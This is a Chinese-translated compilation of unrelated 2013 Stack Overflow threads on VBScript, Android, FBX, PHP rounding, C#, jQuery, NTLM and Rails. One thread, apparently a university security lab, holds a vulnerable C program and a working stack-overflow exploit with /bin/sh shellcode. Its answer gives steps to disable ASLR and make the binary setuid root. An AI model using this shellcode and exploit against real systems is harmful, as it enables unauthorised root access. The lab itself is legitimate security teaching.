为了额外的乐趣，我计划让这个访问多台 PC，并通过 UNC 路径。是的，我希望有更好的方法来做到这一点，但我对 VBS 比较陌生。

当前代码：

```
'Recursive Function handles search of files in folder and subfolders.
Function UNCSearchFolder(strUNCRootPath, strUNCNextFolder)  
 Dim objFSOUNCSearchFolder, objFSOUNCSearchFolder2, colFolderList, objFolder, strCurrentFolder, strSubFolder

 'Get list of Subfolders in folder: <Rootpath>\<Nextfolder>
 strCurrentFolder = strUNCRootPath & "\" & strUNCNextFolder & "\"
 Set objFSOUNCSearchFolder = CreateObject("Scripting.FileSystemObject")
 Set objFSOUNCSearchFolder2 = objFSOUNCSearchFolder.GetFolder(strCurrentFolder)
 Set colFolderList = objFSOUNCSearchFolder2.SubFolders

 'Subfolder dive
 For Each objFolder in colFolderList
  strSubFolder = objFolder.name
  'REMOVE THIS ECHO LATER
  wscript.echo strSubFolder
  UNCSearchFolder(strCurrentFolder, strSubFolder)
 Next

 'Search for files here

 'GC on File Streams
 Set objFSOUNCSearchFolder2 = Nothing
 Set objFSOUNCSearchFolder = Nothing
End Function 
```

那么，是应该将一个文件流用于所有访问，还是应该每个步骤单独使用一个文件流？这是一个有争议的问题吗？这会导致到每个系统的多个连接还是应该只使用一个？基本上，我希望脚本能够在不干扰用户或引起奇怪响应（即，活动连接用完）的情况下正常工作。该脚本只会在我们正在进行的审计中使用几次，但最终可能会重新用于未来的审计。

让我知道你的想法。谢谢你的帮助，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-16T15:36:39.833

如果您选择在函数内部设置对 FSO 的引用，那么在每个递归中都将使用新的 FSO 对象。

使用单个 FSO 对象（全局的或传递的）就足够了。至少我不知道使用多个 FSO 实例有什么好处。

[编辑] 我很欣赏@AnsgarWiechers 的评论，并且为了使代码准备好重新使用，同时将 FSO 排除在函数之外，我们可以将函数包装在一个类中。

```
With New FileInfo
    WScript.Echo .FileSize("C:\temp", "txt", True)
End With

Class FileInfo

    Private m_oFSO

    Public Function FileSize(sRootDir, sExtension, bRecursive)
        Dim oFolder, oFile, sFExt
        sFExt = LCase(sExtension)
        Set oFolder = m_oFSO.GetFolder(sRootDir)
        For Each oFile In oFolder.Files
            If LCase(m_oFSO.GetExtensionName(oFile.Name)) = sFExt Then
                FileSize = FileSize + oFile.Size
            End If
        Next
        If bRecursive Then
            Dim oSubFolder
            For Each oSubFolder In oFolder.SubFolders
                FileSize = FileSize + FileSize(oSubFolder, sExtension, True)
            Next
        End If
    End Function

    Private Sub Class_Initialize
        Set m_oFSO = CreateObject("Scripting.FileSystemObject")
    End Sub

    Private Sub Class_Terminate
        Set m_oFSO = Nothing
    End Sub

End Class 
```

# android - Android：Activity也调用了应用的其他Service，没有被调用

> ID：14903374
> 
> 赞同：0
> 
> 时间：2013-02-15T21:11:04.007
> 
> 标签：android, android-service, android-mediaplayer

我创建了一个基本上包含 2 的 android 应用程序`media players`。一种播放手机内存中的音乐，另一种播放来自互联网（URL）的流。

每个媒体播放器都在其单独的`activity`. 我是`Service`用来播放的。（即当用户按下播放按钮时，服务启动并播放媒体）。

MusicPlayer 是应用程序的默认活动，位于包中`com.example.musicplayer`。而流播放器位于不同的包`com.example.streamplayer`中。

**问题：**当应用程序启动时，我选择流播放器并按下播放按钮，虽然 URL 流被播放，但我也注意到`onStartCommand`其他媒体播放器，即音乐播放器也被调用。

这意味着活动 B 正在调用服务 A，即使两者都在不同的包中。

音乐播放器活动和服务代码

```
package com.example.musicplayer;

public class MusicPlayerActivity extends Activity {

    public void onCreate(Bundle savedInstanceState) {
        ....
        Intent service = new Intent(this, MusicService.class);
        startService(service);
        ....
    }

}

package com.example.musicplayer;

public class MusicService extends Service {

    ....

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        Toast.makeText(this, "Music Service onStartCommand()", Toast.LENGTH_LONG).show();       // This gets displayed even in the Stream Activty

        return START_STICKY;
    }
    ....

} 
```

流活动和服务的代码：

```
package com.example.streamplayer;

public class StreamPlayer extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        ....
        Intent service = new Intent(this, StreamService.class);
        service.putExtra("URL", url);
        startService(service);
        ....
    }
}

package com.example.streamplayer;

public class StreamService extends Service {

    protected void startStream() {
        MediaPlayer mPlayer = new MediaPlayer();
        mPlayer.reset();
        mPlayer.setDataSource(url);
        mPlayer.prepareAsync();
        mPlayer.setOnPreparedListener(new OnPreparedListener() {

            @Override
            public void onPrepared(MediaPlayer mp) {
                mp.start();

            }
        });
    }
} 
```

清单.xml

**注意：**在清单文件中，我还尝试添加以指定哪个服务用于哪个意图。（不确定它是否只这样工作）

```
<service
    android:name=".MusicService"
    android:enabled="true" >
    <intent-filter>
        <action android:name="com.example.musicplayer.MusicPlayerActivity" />
    </intent-filter>
</service>

<service
    android:name="com.example.streamplayer.StreamService"
    android:enabled="true" >
    <intent-filter>
        <action android:name="com.example.streamplayer.StreamService" />
    </intent-filter>
</service> 
```

请建议如何确保不应该调用错误的服务？

这个问题的前传：[这里](https://stackoverflow.com/a/14860443/1433826)

谢谢你

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T00:31:44.123

您的清单仅显示一项服务，即使您已经定义了两项，并且您为定义的服务输入的操作没有意义（它与您在代码中定义的任何操作都不匹配）并且会被忽略，因为两者您发送的意图是明确的。

您是否在清单中定义了这两种服务？

# mesh - 将 FBX SDK 集成到 DirectX

> ID：14903377
> 
> 赞同：0
> 
> 时间：2013-02-15T21:11:12.367
> 
> 标签：mesh, fbx

我正在使用 FBX SDK 2013.3 和 DirectX 上的项目。

我需要一些基础知识，

认为我有一个立方体，从 Maya 导出，扩展名为 .fbx，它有动画，但问题不在于现在。

现在我需要将此 .fbx 文件加载到 DirectX，因此必须处理索引、顶点位置。

我查看了 FBX SDK 文档、示例（主要是 ViewScene 示例）并获得了一些信息。

```
const char* lFilename = ".\..\..\..\DuzZemin.fbx";  

/* Memory Management */
FbxManager* myManager = FbxManager::Create();

FbxIOSettings* ioSettings = FbxIOSettings::Create(myManager,IOSROOT);
myManager->SetIOSettings(ioSettings);

// Importer
FbxImporter* myImporter = FbxImporter::Create(myManager,"");

if( !myImporter->Initialize(lFilename,-1,ioSettings))
{
    /* Error Handling */
}

/* Scene for Imported File */

FbxScene* myScene = FbxScene::Create(myManager,"My Scene");

myImporter->Import(myScene);

    // Memory DeAllocation
myImporter->Destroy();

FbxNode* rootNode = myScene->GetRootNode();

FbxMesh* myMesh = FbxMesh::Create(myScene,"");

int indexCount = myMesh->GetControlPointsCount(); 
```

并且在构建此代码段时，我没有收到任何错误。但在运行时，

indexCount 返回 0 值。

您是否看到任何错误或遗漏的要求？

感谢您的兴趣。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T14:49:40.157

好吧，您创建了一个网格，但您没有将其指向场景中的网格。当我加载了一个 .fbx 文件后，我创建了一个网格指针，然后进入我的场景并抓取网格。考虑这段代码。

```
FbxMesh* mesh;

FbxNode* node = myScene->GetRootNode()->GetChild(0);

//I want my mesh to be formed by triangles so i convert the mesh into triangles
FbxGeometryConverter lConverter(node->GetFbxManager());
lConverter.TriangulateInPlace(node);

mesh = node->GetMesh(); 
```

现在您应该能够从网格中获得正确的顶点数，并能够提取顶点。注意：如果您的 .fbx 文件包含多个网格，那么您需要遍历场景，直到找到所需的网格。

希望这可以帮助

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-05-15T01:53:04.293

```
FbxMesh* mesh;

FbxNode* node = myScene->GetRootNode()->GetChild(0);

//I want my mesh to be formed by triangles so i convert the mesh into triangles
FbxGeometryConverter lConverter(node->GetFbxManager());
lConverter.TriangulateInPlace(node);

mesh = node->GetMesh(); 
```

# php - 四舍五入到最接近的分数（一半、四分之一等）

> ID：14903379
> 
> 赞同：44
> 
> 时间：2013-02-15T21:11:15.290
> 
> 标签：php, rounding, printf, floor, ceil

因此，我需要创建以下函数，但如果没有复杂的数学，我的头脑无法想到 PHP 中的任何可能性。

*   **始终**向上舍入到最接近的小数 (1.81 = 1.90, 1.89 = 1.90, 1.85 = 1.90)
*   **始终**向下舍入到最接近的小数 (1.81 = 1.80, 1.89 = 1.80, 1.85 = 1.80)
*   **始终**向上舍入到最接近的 x.25 / x.50 / x.75 / x.00 (1.81 = 2, 1.32 = 1.50)
*   **始终**向下舍入到最接近的 x.25 / x.50 / x.75 / x.00 (1.81 = 1.75, 1.32 = 1.25)
*   **始终**向上舍入到最接近的 x.50 / 1 (1.23 = 1.50, 1.83 = 2)
*   **始终**向下舍入到最接近的 x.50 / 1 (1.23 = 1, 1.83 = 1.50)

我已经在 Google 上搜索了 2 个小时，唯一出现的就是 Excel 论坛。是否可以使用一些简单的 PHP 行？

* * *

## 回答 #1

> 赞同：122
> 
> 时间：2013-02-15T21:19:25.190

由于您正在寻找*四分之二*（`.00`, `.25`, `.50`, `.75`），请将您的数字乘以 4，根据需要四舍五入到最接近的整数（`floor`如果向下，`ceil`如果向上），然后除以 4。

*1.32，向下到最接近的第四位*：

> 1.32 * 4 = 5.28
> 楼层(5.28) = 5.00
> 5.00 / 4 = **1.25**

同样的原则适用于任何其他分数，例如*三分之二*或*八分之*三（`.0`, `.125`, `.25`, `.375`, `.5`, `.625`, `.75`, `.875`）。例如：

*1.77，直到最接近的八分之一*：

> 1.77 * 8 = 14.16
> ceil(14.16) = 15.00
> 15.00 / 8 = **1.875**

* * *

只是为了好玩，你可以写一个这样的函数：

```
function floorToFraction($number, $denominator = 1)
{
    $x = $number * $denominator;
    $x = floor($x);
    $x = $x / $denominator;
    return $x;
}

echo floorToFraction(1.82);      // 1
echo floorToFraction(1.82, 2);   // 1.5
echo floorToFraction(1.82, 3);   // 1.6666666666667
echo floorToFraction(1.82, 4);   // 1.75
echo floorToFraction(1.82, 9);   // 1.7777777777778
echo floorToFraction(1.82, 25);  // 1.8 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-03-11T10:45:03.930

请注意，答案并不是真的水密。由于我们在这里处理浮点数，因此不能保证当您将舍入数除以分母时，它会返回一个整齐的整数。它可能返回 1.499999999999 而不是 1.5。这是浮点数的本质。

在从函数返回数字之前需要进行另一轮。

以防有人像我一样从谷歌登陆这里:)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2016-09-04T07:38:36.190

根据`mround()`Excel中的函数：

```
function MRound($num,$parts) {
    $res = $num * $parts;
    $res = round($res);
    return $res /$parts;
}
echo MRound(-1.38,4);//gives -1.5
echo MRound(-1.37,4);//gives -1.25
echo MRound(1.38,4);//gives 1.5
echo MRound(1.37,4);//gives 1.25 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-15T21:15:27.513

看看这里的例子#3，它是你解决方案的一半 - [http://php.net/manual/en/function.round.php](http://php.net/manual/en/function.round.php)

# c# - 有效地序列化锯齿状字节数组

> ID：14903385
> 
> 赞同：5
> 
> 时间：2013-02-15T21:12:07.463
> 
> 标签：c#, .net, wcf, datacontractserializer

我有一个锯齿状数组`DataMember`，它返回`byte[800][10000][1]`转换为约 8MB 的数据。当使用`DataContractSerializer`它进行序列化时，二进制文件大小为 120MB，文本文件大小为 300MB。查看文本序列化，它表明它在每个字节值周围放置了一个标签，以表明它是一个 base64 编码值等，这可能是这种大小放大的原因。

`DataContractSerializer`使用（或任何其他序列化程序）序列化大型锯齿状blob的有效方法是什么？

使用 Text 序列化时的片段 XML 输出：

```
<a:ArrayOfbase64Binary><a:base64Binary>CQ==</a:base64Binary><a:base64Binary>Bw==</a:base64Binary><a:base64Binary>BQ==</a:base64Binary><a:base64Binary>AA==</a:base64Binary><a:base64Binary>AQ==</a:base64Binary><a:base64Binary>AA==</a:base64Binary><a:base64Binary>BA==</a:base64Binary><a:base64Binary>Bg==</a:base64Binary><a:base64Binary>CA==</a:base64Binary><a:base64Binary>AA==</a:base64Binary><a:base64Binary>AA==</a:base64Binary><a:base64Binary>AA==</a:base64Binary><a:base64Binary>AA==</a:base64Binary><a:base64Binary>AA==</a:base64Binary><a:base64Binary>AA==</a:base64Binary><a:base64Binary>AA==</a:base64Binary> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-15T21:19:52.347

[`BinaryFormatter`](http://msdn.microsoft.com/en-us/library/system.runtime.serialization.formatters.binary.binaryformatter.aspx)如果您不关心与其他系统的互操作性而只关心性能，您可以尝试使用：

```
byte[800][10000][1] foo = ... fetch it
BinaryFormatter formatter = new BinaryFormatter();
using (var stream = File.OpenWrite("foobar.dat"))
{
    formatter.Serialize(stream, foo);
} 
```

# php - php mysql表中的提交按钮

> ID：14903386
> 
> 赞同：0
> 
> 时间：2013-02-15T21:12:13.057
> 
> 标签：php, javascript, jquery

是）我有的：

```
<table class="sortable table table-hover table-bordered">
  <thead>
  <tr>
    <th>CPU</th>
    <th>Speed</th>
    <th>Cores</th>
    <th>TDP</th>
    <th>Preformace</th>
    <th>Overclocing</th>
    <th>Price</th>
    <th>Buy</th>
  </tr>
  </thead>
  <tbody>
  <?php $i=0 ;
    do {
    $preformace = $row_Procesory['Preformace'];
    $over = $row_Procesory['Overclocing'];
    $i++; ?>
    <tr>
    <td><?php echo $row_Procesory['CPU']; ?></td>
    <td><?php echo $row_Procesory['Speed']; ?></td>
    <td><?php echo $row_Procesory['Cores']; ?></td>
    <td><?php echo $row_Procesory['TDP']; ?></td>
    <td><?php echo "
    <script type='text/javascript'>
    $(document).ready(function() {
    $('#progressbarP$i').height(10).progressbar({
                                    value : 1
                                    });
    $('#progressbarP$i .ui-progressbar-value').animate(
    {width: '$preformace%'},{queue: false});
    });
    </script>
    <div id='progressbarP$i' title='$preformace'></div>  
    ";?></td>

    <td><?php echo "
    <script type='text/javascript'>
    $(document).ready(function() {
    $('#progressbarO$i').height(10).progressbar({
                                    value : 1
                                    });             
    $('#progressbarO$i .ui-progressbar-value').animate({
        width: '$over%'
        }, 1000);
    });
    </script>
    <div id='progressbarO$i' title='$over'></div>  
    ";?></td>

    <td><?php echo $row_Procesory['Price']; ?></td>
    <!-- BUTTON SECTION -->
   <td><?php echo "<button class='btn btn-success' type='button' align='CENTER'>Add</button>";?></td>
  </tr>
    <?php } while ($row_Procesory = mysql_fetch_assoc($Procesory)); ?>
</tbody>
</table> 
```

基本上我循环通过mysql并显示行。在 preformace 和超频列中，我显示了带有 mysql 值的动画 jquery progresbar。我还使用 bootstrap 和 sortable.js 使表格可排序。

[它的样子：](http://i.stack.imgur.com/sVxP2.png)

我想要什么：当我单击添加按钮时，处理器的名称将作为变量发送到 test.php。我什至不知道如何使用 jquery 定位名称元素：D

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:24:01.250

如果我在这里理解您的问题，可以提供帮助

```
<table class="sortable table table-hover table-bordered">
  <thead>
  <tr>
    <th>CPU</th>
    <th>Speed</th>
    <th>Cores</th>
    <th>TDP</th>
    <th>Preformace</th>
    <th>Overclocing</th>
    <th>Price</th>
    <th>Buy</th>
  </tr>
  </thead>
  <tbody>
  <?php $i=0 ;
    do {
    $preformace = $row_Procesory['Preformace'];
    $over = $row_Procesory['Overclocing'];
    $i++; ?>
    <tr>
    <td><?php echo $row_Procesory['CPU']; ?></td>
    <td><?php echo $row_Procesory['Speed']; ?></td>
    <td><?php echo $row_Procesory['Cores']; ?></td>
    <td><?php echo $row_Procesory['TDP']; ?></td>
    <td><?php echo "
    <script type='text/javascript'>
    $(document).ready(function() {
    $('#progressbarP$i').height(10).progressbar({
                                    value : 1
                                    });
    $('#progressbarP$i .ui-progressbar-value').animate(
    {width: '$preformace%'},{queue: false});
    });
    </script>
    <div id='progressbarP$i' title='$preformace'></div>  
    ";?></td>

    <td><?php echo "
    <script type='text/javascript'>
    $(document).ready(function() {
    $('#progressbarO$i').height(10).progressbar({
                                    value : 1
                                    });             
    $('#progressbarO$i .ui-progressbar-value').animate({
        width: '$over%'
        }, 1000);
    });
    </script>
    <div id='progressbarO$i' title='$over'></div>  
    ";?></td>

    <td><?php echo $row_Procesory['Price']; ?></td>
    <!-- BUTTON SECTION -->
   <td><?php echo "<button class='btn btn-success pro_btn' processor = '".$row_Procesory['CPU']."'  type='button' align='CENTER'>Add</button>";?></td>
  </tr>
    <?php } while ($row_Procesory = mysql_fetch_assoc($Procesory)); ?>
</tbody>
</table> 
```

该解决方案（**处理器属性**）是为了避免选择器，如果您需要，我们可以提供其他选择器

```
$('.pro_btn').die('click').live('click',function(e){
     var name = $(this).attr('processor');
     $.post('test.php',{'processor_name':name}, function(response) {
    // log the response to the console
         console.log("Response: "+response);
     });

}); 
```

**如果您不想使用该属性，您可以执行以下操作**

```
var name = $(this).closest('tr').find('td:first').text(); 
```

我希望这可以帮助:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:37:12.200

捕获点击事件并找到最接近的“tr”，然后找到该“tr”的第一个“td”。那将是这样的：

```
$(this).closest('tr').find('td:first').text(); 
```

或者获取按钮的父项，这将是 td，它们是 td 的父项。那将是tr。最后得到第一个 td。

```
$(this).parent().parent().find('td:first').text(); 
```

或者只是为您的按钮添加一个附加属性，然后获取值。

```
$(this).attr('processor'); 
```

# c# - 使用 httplistener 的 NTLM 身份验证

> ID：14903393
> 
> 赞同：1
> 
> 时间：2013-02-15T21:12:46.040
> 
> 标签：c#, ntlm, httplistener

我想在用 C# 编写的 httplistener 中实现 NTLM 身份验证。我在 Internet 上找不到获取此信息的好地方。我已经编写了基本身份验证，但无法继续使用 NTLM 身份验证。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:25:41.267

Try setting the [`AuthenticationSchemes`](http://msdn.microsoft.com/en-us/library/system.net.httplistener.authenticationschemes.aspx) property on your listener to `Negotiate`:

```
listener.AuthenticationSchemes = AuthenticationSchemes.Negotiate; 
```

# c - 缓冲区溢出 - 普通用户中的 SegFaults

> ID：14903394
> 
> 赞同：4
> 
> 时间：2013-02-15T21:12:53.283
> 
> 标签：c, ubuntu-12.04, buffer-overflow, stack-smash, fortify-source

下面是我的代码，包括易受攻击的程序（stack.c）和我的漏洞利用程序（exploit.c）。此代码适用于教授发送给 Windows 用户的预打包 Ubuntu 9（我有一个朋友在他的计算机上对其进行了测试），但是在我在 iMac 上运行的 Ubuntu 12 上，当我尝试执行此操作时会出现段错误在普通用户中。

这是堆栈：

```
//stack.c
#include <stdio.h>

int bof(char *str)
{
char buffer[12];

//BO Vulnerability
strcpy(buffer,str);

return 1;
}

int main(int argc, char* argv[])
{
char str[517];

FILE *badfile;
    badfile = fopen("badfile","r");

fread(str, sizeof(char),517, badfile);
bof(str);

printf("Returned Properly\n");
return 1;
} 
```

并利用：

```
//exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define DEFAULT_OFFSET 350 

char code[]=
"\x31\xc0" 
"\x50" 
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1"
"\x99"
"\xb0\x0b" 
"\xcd\x80"
;

unsigned long get_sp(void)
{
     __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
char buffer[517];
FILE *badfile;
char *ptr;
long *a_ptr,ret;

int offset = DEFAULT_OFFSET;
int codeSize = sizeof(code);
int buffSize = sizeof(buffer);

if(argc > 1) offset = atoi(argv[1]); //allows for command line input

ptr=buffer;
a_ptr = (long *) ptr;

/* Initialize buffer with 0x90 (NOP instruction) */
memset(buffer, 0x90, buffSize);

//----------------------BEGIN FILL BUFFER----------------------\\

ret = get_sp()+offset;
    printf("Return Address: 0x%x\n",get_sp());
    printf("Address: 0x%x\n",ret);

ptr = buffer;
    a_ptr = (long *) ptr;

int i;
for (i = 0; i < 300;i+=4)
    *(a_ptr++) = ret;

for(i = 486;i < codeSize + 486;++i)
    buffer[i] = code[i-486];

buffer[buffSize - 1] = '\0';
//-----------------------END FILL BUFFER-----------------------\\

/* Save the contents to the file "badfile" */
badfile = fopen("./badfile", "w");
fwrite(buffer,517,1,badfile);
fclose(badfile);    
} 
```

为了在 Ubuntu 12 中编译这些，我使用了：

```
gcc -o stack -fno-stack-protector -g -z execstack stack.c
gcc -o exploit exploit.c 
```

同样，它适用于 root 用户，而不是普通用户； ![例子](../Images/4cd6edf0f16781ce303e767a530139af.png)

无论如何，这是在午夜到期的，我在这个限制下一瘸一拐地完成了剩下的任务，但如果有人有建议，我宁愿正确地完成它。我想在认输之前先请专家。我正在寻找为什么此代码无法在普通用户中运行（因为它应该在旧版本的 ubuntu 上运行）但在 root 用户中运行。我还需要更改什么才能在普通用户中进行这项工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T23:55:53.057

我刚刚在 Ubuntu 12.04 VM 上运行了您提供的代码，它运行良好。我的猜测是你没有关闭 ASLR。在禁用 ASLR 的情况下再试一次

```
sudo su    
echo 0 > /proc/sys/kernel/randomize_va_space
exit 
```

或者

```
setarch `uname -i` -R ./stack 
```

当然，为了让它产生一个 root shell，你首先需要做：

```
sudo chown root:root stack
sudo chmod u+s stack 
```

希望这可以帮助 ...

# c# - 解析字符串以查找 C# 中的短语

> ID：14903395
> 
> 赞同：-8
> 
> 时间：2013-02-15T21:12:57.190
> 
> 标签：c#, parsing

我正在尝试在字符串中查找一组数字和字母。

这是我正在查看的短语：

```
Rx: RX15046522B Brand: LEVOTHYROXINE SODIUM Generic: LEVOTHYROXINE SODIUM  NDC: 00378180001 Barcode: 0378180001 Strength: 25 mcg Form: Tablet Color: orange Marking:  Shape: oblong 
```

我想把这部分变成另一个字符串：

```
NDC: 00378180001 
```

我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:19:48.223

如果它总是“NDC: [number]”，你可以使用一个相当简单的正则表达式。

```
var re = new System.Text.RegularExpressions.Regex(@"NDC\:\s(\d{11})");
var phrase = "Rx: RX15046522B Brand: LEVOTHYROXINE SODIUM Generic: LEVOTHYROXINE SODIUM NDC: 00378180001 Barcode: 0378180001 Strength: 25 mcg Form: Tablet Color: orange Marking: Shape: oblong";
if (re.IsMatch(phrase))
{
    var match = re.Match(phrase);
    // entire NDC string
    context.Response.Write(match.Value);
    // just the number
    context.Response.Write(match.Groups[1].Value);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:22:50.113

因此，您正在寻找由 3 个字母、一个冒号、一个空格和 11 个数字组成的模式？

正则表达式

```
[A-Z]{3}\:\s\d{11} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-15T21:23:35.730

```
 String S = "Rx: RX15046522B Brand: LEVOTHYROXINE SODIUM Generic: LEVOTHYROXINE SODIUM NDC: 00378180001 Barcode: 0378180001 Strength: 25 mcg Form: Tablet Color: orange Marking: Shape: oblong";

        Regex myRegex = new Regex(@"[0-9]+(?:\.[0-9]*)?", RegexOptions.Compiled);
        foreach (Match iMatch in myRegex.Matches(S))
        {
            if (iMatch.Value.Length==11)
            {
            MessageBox.Show(iMatch.Value);
            }
        } 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-15T21:17:00.207

查看这些页面 - [http://msdn.microsoft.com/en-us/library/ms228630%28v=vs.80%29.aspx](http://msdn.microsoft.com/en-us/library/ms228630%28v=vs.80%29.aspx) [http://msdn.microsoft.com/en-us/library/system .string.substring%28v=vs.71%29.aspx](http://msdn.microsoft.com/en-us/library/system.string.substring%28v=vs.71%29.aspx)

使用 string.substring 将是您最好的选择。

# google-apps-script - 将文件附件与 Google Docs 表单提交一起发送，并通过电子邮件发送？

> ID：14903402
> 
> 赞同：9
> 
> 时间：2013-02-15T21:13:31.280
> 
> 标签：google-apps-script, google-forms, google-docs-api

我正在使用 GDocs 构建一个表单，然后将表单取出到我的网页中，这样我就可以直接编辑表单（所以我可以完全控制表单代码）。

现在，我可以[将结果提交到 Google Docs](http://www.blogxpertise.com/2011/11/tip-adding-submission-form-to-your-blog.html)，然后[将结果通过电子邮件发送给我](http://www.blogxpertise.com/2012/04/tip-making-google-doc-submission-form.html)。

我想为这些提交添加一个文件附件，使用：

```
<input type="file" name="datafile" id="filedata" size="40"> 
```

我知道我可以使用 mailApp.sendEmail 的高级参数，特别是附件参数或 inlineImages 参数。

但是我如何访问文件值以便附加它们发送？

# javascript - 检查是否使用 jQuery 设置了请求属性

> ID：14903403
> 
> 赞同：0
> 
> 时间：2013-02-15T21:13:33.670
> 
> 标签：javascript, jquery, servlets

是否可以检查请求对象中是否存在属性？在某些错误情况下，必须将错误消息传递到客户端：

小服务程序代码：

```
request.setAttribute("error", "The following term was not found in the index: " + terms);
RequestDispatcher dispatcher = request.getRequestDispatcher("graph.jsp");
dispatcher.forward(request, response); 
```

我像这样尝试过，但我根本没有收到警报窗口......

JSP 代码：

```
<script>
   var test = "${error}";
   if(test != null)
       alert(test);
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T12:07:28.970

在您的情况下，您应该检查空，但不检查 null。 `if(test != "")`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:39:22.297

如果我没看错，你有一个 JSP 应用程序输出这个 JavaScript。换句话说，您的 JSP 页面将变量 error 设置为字符串值。然后使用它来生成 JavaScript，您想要提醒错误变量的内容。

您的 JS 代码通常是正确的。有几件事对我来说很突出：

1）在脚本标签中添加语言属性（如下图）

```
<script language="javascript">
    var test = "${error}";
    if(test != null)
        alert(test);
</script> 
```

2) 检查浏览器中的错误

我测试了你在这里的代码，当错误值类似于“hello world”时，它对我有用。测试变量被设置为此。字符串不等于 null （尽管空字符串也不等于 null 所以你的 if 语句有点没用）。这让我觉得你从 ${error} 输出的字符串可能有一个双引号。

假设您的错误是：在索引中找不到以下术语：“鳄梨”。

您生成的 JS 如下所示：

```
<script language="javascript">
    var test = "The following term was not found in the index: "avocado"";
    if(test != null)
        alert(test);
</script> 
```

注意双引号字符串中的双引号。这是一个语法错误。

如果您使用的是 chrome，请打开开发人员工具（查看 > 开发人员 > 控制台）。重新加载页面。您是否看到报告的错误消息？如果是，错误是什么？如果不是，请查看您的源代码并查看生成的 JS 并将其发布在此处以供审查。

# android - 为什么使用 HttpClient 时服务器响应中省略了 Content-Length 标头？

> ID：14903404
> 
> 赞同：3
> 
> 时间：2013-02-15T21:14:11.113
> 
> 标签：android, http-headers

我正在使用这个问题的源代码[如何异步执行 httprequest 并显示下载响应的进度，](https://stackoverflow.com/questions/9594318/how-to-asynchronous-perform-a-httprequest-and-show-the-progress-of-downloading-t) 以便获取网页的 html 源并显示一个进度条，其中包含到目前为止下载的数据以及页面的总大小是多少。

该特定代码实际上不适用于 ICS 4.0.3，因为 clHeaders[0] 没有指向任何内容，并且在索引 0 处引发了称为 ArrayIndexOutOfBounds 的异常，因为服务器响应中省略了 Content-Length 标头。我尝试使用 getContentLength 以防出现问题 - 它返回负值 -1 然后我遍历所有标题并且 Content-Length 不存在。删除这些位后，代码工作正常，网页被提取，写入文件并显示正在下载的大小，但显然不是最终大小，直到我真正下载它。

我对原因只有三个想法：

1.  我没有发送 Content-Length 标头，因此我也没有收到 - 但这听起来是错误的。另外，我不知道 HttpClient 是否没有在后台发送一个。
2.  我在这里读到另一个问题，如果服务器的响应是流式传输或分块的，那么 getContentLength 可以返回-1。
3.  压缩包？但我不知道如何禁用它或者是否首先启用它

如果您认为是服务器坏了，我尝试了包括 Google 在内的许多网站，但仍然没有任何 Content-Length 标头。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-08T10:33:18.030

Content-Length 标头是可选的，它仅对 HEAD 请求或非常大的数据有用，如果内容太大，客户端可能会决定要中止请求。所以是的，Content-Length 并不总是存在。除此之外，您通常应该通过读取数据来获取内容长度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-08T11:45:33.780

在某些情况下，Content-Length 不应包含在响应中或应被忽略。这些案例[记录在 W3 网站上](http://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html#sec4.4)。例如，如果您的内容具有 gzip 的传输编码，则应该忽略 content-length。

# ruby-on-rails - 子页面的Rails 3路线

> ID：14903405
> 
> 赞同：0
> 
> 时间：2013-02-15T21:14:14.337
> 
> 标签：ruby-on-rails, ruby-on-rails-3, controller, routes

我在 Rails 3 路由中遇到了一点问题

我有一个控制器页面，它显示我的页面，例如

```
example.com/some_page_title 
```

但现在我需要在当前页面中放一个子页面

```
example.com/some_page_title/some_subpage_title 
```

我的路线现在看起来像这样：

```
match ':title' => 'page#show' 
```

但是如何显示子页面？我通过 fild parent_id 识别这是子页面是真的，这必须是子页面，但这是主页面是假的。我是否必须将我的子页面放到其他控制器甚至其他数据库表中？

如果想将我的子页面更改为普通页面该怎么办，现在我只需删除 parent_id 并完成。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:45:42.050

你可以试试：

```
match :parent_title/:title => "pages#show" 
```

假设：

```
class Page
   has_many :subpages, :class_name => "Page"
end 
```

在控制器中

```
def show
  if params[:parent_title].present?
    parent = Page.find_by_title params[:parent_title]
    @page = parent.subpages.find_by_title params[:title] if parent.present?
  end
end 
```

# php - 在响应式布局上用 php 更改 html

> ID：14903407
> 
> 赞同：0
> 
> 时间：2013-02-15T21:14:16.470
> 
> 标签：php, css, responsive-design

我有一个关于响应式布局的问题。假设一旦浏览器大小小于“xx”，我就有一个样式完全不同的 css 文件。在我的示例中，css 代码如下：

```
@media only screen and (-webkit-min-device-pixel-ratio: 1.5), only screen and (min-device-pixel-ratio: 1.5), only screen and (max-width: 960px) 
```

